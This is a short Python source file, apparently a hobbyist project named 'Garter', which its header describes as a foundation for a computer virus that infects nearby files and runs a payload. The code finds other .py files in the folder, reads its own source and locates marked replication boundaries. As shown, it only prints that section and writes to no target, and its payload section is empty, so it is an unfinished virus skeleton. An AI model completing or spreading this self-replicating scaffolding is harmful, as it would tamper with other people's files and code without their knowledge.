'''
==============================================================================
"Garter" - By Zgell
A simple and harmless foundation for a Python-based computer virus capable of
infecting nearby files and executing a specific payload.
==============================================================================
'''



### REPLICATION START ###
# Self-Replication Section
import os, glob

selfname = os.path.basename(__file__)

targets = glob.glob('*.py')
targets.remove(selfname)

f = open(targets[0], 'r')
targetfile = f.readlines()

f2 = open(selfname, 'r')
selffile = f2.readlines()

index_start = selffile.index('### REPLICATION START ###\n')
index_end = selffile.index('### REPLICATION END ###\n')
# Executed Payload Section
### REPLICATION END ###



'''
for line in targetfile:
    # Since each line has '\n' character, remove it
    print(line.replace('\n', ''))

for line in selffile:
	print(line.replace('\n', ''))
'''

print(selffile[index_start:index_end])
